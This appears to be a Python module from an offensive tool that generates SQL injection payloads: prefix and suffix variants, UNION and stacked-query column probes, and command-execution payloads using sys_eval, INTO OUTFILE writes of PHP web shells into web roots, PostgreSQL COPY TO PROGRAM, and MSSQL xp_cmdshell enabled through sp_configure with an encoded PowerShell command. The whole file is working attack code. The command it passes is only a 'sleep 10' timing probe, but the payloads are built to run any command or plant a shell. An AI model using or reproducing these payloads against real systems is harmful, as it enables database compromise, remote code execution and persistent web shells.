from .const import PHP_SHELL_CITATION, PHP_SHELL_PING, WEBROOTS

def sqli_prefix(args):
    return [
        b"",
        b"'", b"%'", b"')", b"'))", b"%')", b"%'))",
        b'"', b'%"', b'")', b'"))', b'%")', b'%"))'
    ]

def sqli_suffix(args):
    return [
        b"", b"-- ", b"--- ", b"# ", b"// ", b"-- // ", b"--- // ", b"# // "
    ]

def sqli_data_cols(max_len: int = 16, quote_signs = ['"', "'"], first_value = None):
    for l in range(1, max_len):
        for quote_sign in quote_signs:
            numeric_cols = ", ".join([str(i) for i in range(l)])
            string_cols = f"{quote_sign}{f"{quote_sign}, {quote_sign}".join([chr(97 + i) for i in range(l)])}{quote_sign}"

            if first_value:
                numeric_cols = first_value + numeric_cols[1:]
                string_cols = first_value + string_cols[len(quote_sign) * 2 + 1:]

            yield numeric_cols, string_cols

def sqli_union_stack(args): # Assumes known prefix and suffix
    for cols_numeric, cols_str in sqli_data_cols():
        for cols in [cols_numeric, cols_str]:
            yield f" UNION SELECT {cols}".encode()
            yield f"; SELECT {cols} WHERE 1=2".encode() # Select 0 rows
            yield f"; SELECT {cols}".encode() # Select 1 row

        # Select 2 rows
        for cols1, cols2 in [(cols_numeric, cols_numeric), (cols_numeric, cols_str), (cols_str, cols_numeric), (cols_numeric, cols_numeric)]:
            yield f"; SELECT {cols1} UNION SELECT {cols2}".encode()
            yield f'; SELECT {cols1} UNION SELECT {cols2}'.encode() 

def sqli_execute_all(args, os, command): # Assumes known prefix and suffix
    select_payloads = [
        (f"sys_eval('{command}')", '', "'"),
        (f'sys_eval("{command}")', '', '"'),
        (f"sys_exec('{command}')", '', "'"),
        (f'sys_exec("{command}")', '', '"'),
    ]

    for root in WEBROOTS[os]:
        abs_file = f"{root}/shell.php"
        select_payloads.append((f"'{PHP_SHELL_CITATION}'", f" INTO OUTFILE '{abs_file}'", "'"))
        select_payloads.append((f'"{PHP_SHELL_PING}"', f' INTO OUTFILE "{abs_file}"', '"'))
        select_payloads.append((f"0x{PHP_SHELL_CITATION.encode().hex()}", f" INTO OUTFILE '{abs_file}'", "'"))
        select_payloads.append((f"0x{PHP_SHELL_PING.encode().hex()}", f' INTO OUTFILE "{abs_file}"', '"'))

    for value, suffix, quote_sign in select_payloads:
        yield f"SELECT {value}{suffix}".encode()

        for cols_numeric, cols_str in sqli_data_cols(quote_signs=[quote_sign], first_value=f"{value}"):
            for cols in [cols_numeric, cols_str]:
                yield f"UNION SELECT {cols}{suffix}".encode()
    
    # PostgreSQL specific
    yield f"COPY (SELECT '{PHP_SHELL_CITATION}') TO '{abs_file}'".encode()
    yield f'COPY (SELECT "{PHP_SHELL_PING}") TO "{abs_file}"'.encode()
    yield f"COPY (SELECT '') TO PROGRAM '{command}'".encode()
    yield f'COPY (SELECT "") TO PROGRAM "{command}"'.encode()

def sqli_execute_linux(args): # Assumes known prefix and suffix
    yield from sqli_execute_all(args, os = "LINUX", command = "sleep 10")

def sqli_execute_windows(args):
    command = "powershell.exe -ep bypass -e cwBsAGUAZQBwACAAMQAwAA==" # sleep 10

    yield from sqli_execute_all(args, "WINDOWS", command)

    # MSSQL specific
    for quote_sign in ["'", '"']:
        yield f"EXECUTE sp_configure {quote_sign}show advanced options{quote_sign}, 1; RECONFIGURE; EXECUTE sp_configure {quote_sign}xp_cmdshell{quote_sign}, 1; RECONFIGURE; EXECUTE xp_cmdshell {quote_sign}{command}{quote_sign}".encode()
        yield f"EXECUTE sp_configure {quote_sign}show advanced options{quote_sign}, 1; RECONFIGURE; EXECUTE sp_configure {quote_sign}xp_cmdshell{quote_sign}, 1; RECONFIGURE".encode()
        yield f"EXECUTE xp_cmdshell {quote_sign}{command}{quote_sign}".encode()